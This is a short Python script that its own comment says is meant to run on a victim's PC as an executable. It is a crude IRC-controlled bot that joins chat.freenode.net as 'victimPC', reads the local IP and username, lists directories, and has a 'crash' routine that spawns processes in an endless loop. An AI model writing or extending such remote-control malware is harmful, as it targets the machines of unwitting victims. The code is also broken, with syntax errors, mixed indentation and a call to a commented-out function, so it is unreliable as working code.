import socket 
import os
import sys
from requests import *
import irc.client

#This file would be run on a VICTIM pc as an exe

#grabbing private and public ip to show 
private_ip = socket.gethostbyname(socket.gethostname())
#public_ip = get('https://api.ipify.org').text

#create socket object for getting commands from IRC
s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
s.bind(('', 80))

channel = '#python'
USERNAME = 'victimPC'
reactor = irc.client.Reactor()


def handlers(_server):
    _server.add_global_handler('welcome', on_connection)
    _server.add_global_handler('join', on_join)
    _server.add_global_handler('disconnect', on_disconnect)
    _server.add_global_handler('privmsg', on_msg)
    _server.add_global_handler('pubmsg', on_msg)
    
def on_connection(_server, event):
    global channel
    channel = raw_input('What channel or user to message?')
    if irc.client.is_channel(channel):
        _server.join(channel)
        return

def on_join(_server, event):
    read(_server)

def on_disconnect(_server, event):
    sys.exit('Disconnected!')

def on_msg(_server, event):
    print (event.source).split('!')[0] + ': ' str(event.arguments[0])
    
def check_msg(msg):
    command = msg.split(' ')
    size = len(command)
    if size > 0:
    	if command[0] == 'cmd':
	    	if command[1] == 'crash':
				crash()
				#else raise or break
    else:
        return
	
#def read(_server):
 #   while True:
 #   	reactor.process_once()
 #       msg = raw_input(USERNAME + ': ')
 #       if msg.lower() == '/quit':
 #           _server.quit()
 #           break
  #      else:
  #          _server.privmsg(channel, msg)

        
def main():
    
    try:
        server = reactor.server().connect('chat.freenode.net', 6667, USERNAME )
    except irc.client.ServerConnectionError:
        print('ServerConnectoinError')

    handlers(server)
    

    reactor.process_forever()

    
#crash
def crash():
  while True:
    os.system('start')
#get username
def username():
	os.getlogin()

#list directory
def listPath(path):
	os.listdir(path)


if __name__ == '__main__':     
    main()
